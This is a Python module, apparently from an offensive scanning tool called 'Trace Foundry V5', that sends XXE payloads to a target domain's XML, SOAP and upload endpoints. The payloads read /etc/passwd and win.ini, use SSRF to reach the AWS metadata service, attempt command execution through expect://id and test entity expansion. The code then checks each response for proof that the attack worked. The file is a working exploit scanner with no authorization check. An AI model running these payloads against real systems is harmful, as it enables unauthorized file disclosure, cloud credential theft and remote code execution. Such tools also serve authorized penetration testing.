"""
Trace Foundry V5 - XXE / XML Injection Scanner
Blind XXE, entity expansion DoS, SOAP/XML API endpoints
"""
import urllib.request
import urllib.error
import re
from utils.display import section, ok, warn, info, bug_found

XXE_PAYLOADS = [
    # Classic file read
    ("""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",
     "root:x:", "Classic XXE — /etc/passwd"),

    # Windows file read
    ("""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]>
<root><data>&xxe;</data></root>""",
     "[fonts]", "Classic XXE — win.ini"),

    # SSRF via XXE
    ("""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>""",
     "ami-id", "XXE SSRF — AWS metadata"),

    # PHP expect wrapper
    ("""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root><data>&xxe;</data></root>""",
     "uid=", "XXE RCE via expect://"),

    # Billion laughs (DoS detection - safe version)
    ("""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;">
]>
<root>&lol3;</root>""",
     None, "XML Entity Expansion (DoS)"),
]

XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/x-www-form-urlencoded",
]

XML_ENDPOINTS = [
    "/api","/api/v1","/api/v2",
    "/soap","/wsdl","/ws",
    "/xmlrpc.php","/xml",
    "/api/xml","/upload","/import",
    "/api/v1/import","/data/import",
]

class XXEModule:
    def __init__(self, domain, timeout=6):
        self.domain  = domain
        self.timeout = timeout

    def _post_xml(self, url, xml_data, content_type="application/xml"):
        try:
            req = urllib.request.Request(url, data=xml_data.encode())
            req.add_header("Content-Type", content_type)
            req.add_header("User-Agent", "Mozilla/5.0")
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                body = r.read(32768).decode("utf-8", errors="ignore")
                return body, r.status
        except urllib.error.HTTPError as e:
            try:    body = e.read(16384).decode("utf-8", errors="ignore")
            except: body = ""
            return body, e.code
        except:
            return "", 0

    def _fetch(self, url):
        try:
            req = urllib.request.Request(url,
                headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return r.read(16384).decode("utf-8", errors="ignore"), r.status
        except urllib.error.HTTPError as e:
            try:    body = e.read(8192).decode("utf-8", errors="ignore")
            except: body = ""
            return body, e.code
        except:
            return "", 0

    def _detect_xml_endpoint(self, url, body, status):
        """Check if endpoint accepts XML"""
        if status in (200, 201, 400, 422, 500):
            ct_hints = ["xml","soap","wsdl"]
            return any(h in body.lower() for h in ct_hints) or status in (200,)
        return False

    def run(self):
        section("XXE / XML Injection Scanner (File Read | SSRF | DoS)")
        all_bugs = []

        for endpoint in XML_ENDPOINTS:
            for scheme in ["https","http"]:
                base_url = f"{scheme}://{self.domain}{endpoint}"
                body, status = self._fetch(base_url)
                if status == 0:
                    continue

                # Check WSDL
                if "?wsdl" in endpoint or status == 200:
                    wsdl_body, _ = self._fetch(base_url + "?wsdl")
                    if "<wsdl:" in wsdl_body or "<definitions" in wsdl_body:
                        all_bugs.append({
                            "type":     "XXE — WSDL/SOAP Endpoint Exposed",
                            "severity": "MEDIUM",
                            "url":      base_url + "?wsdl",
                            "evidence": "WSDL definition file accessible",
                            "impact":   "SOAP service exposed — potential XXE via XML body",
                        })
                        bug_found("XXE — WSDL/SOAP Endpoint Exposed", "MEDIUM", {
                            "URL":      base_url + "?wsdl",
                            "Evidence": "WSDL file accessible",
                            "Impact":   "SOAP service may be vulnerable to XXE injection",
                        })

                for xml_payload, expected, label in XXE_PAYLOADS:
                    for ct in XML_CONTENT_TYPES[:2]:
                        resp_body, resp_status = self._post_xml(base_url, xml_payload, ct)
                        if not resp_body:
                            continue

                        if expected and expected.lower() in resp_body.lower():
                            all_bugs.append({
                                "type":     f"XXE — {label}",
                                "severity": "CRITICAL",
                                "url":      base_url,
                                "payload":  xml_payload[:100],
                                "evidence": f"Expected output '{expected}' found in response",
                                "impact":   "XML external entity injection — file read / SSRF / RCE",
                            })
                            bug_found(f"XXE — {label}", "CRITICAL", {
                                "URL":      base_url,
                                "Payload":  xml_payload[:80],
                                "Evidence": f"'{expected}' in response",
                                "Impact":   "XXE confirmed — file read / SSRF / potential RCE",
                            })
                            break
                break

        info(f"XXE scan done — {len(all_bugs)} findings")
        if not all_bugs:
            ok("No XXE found ✓")
        return {"bugs": all_bugs}
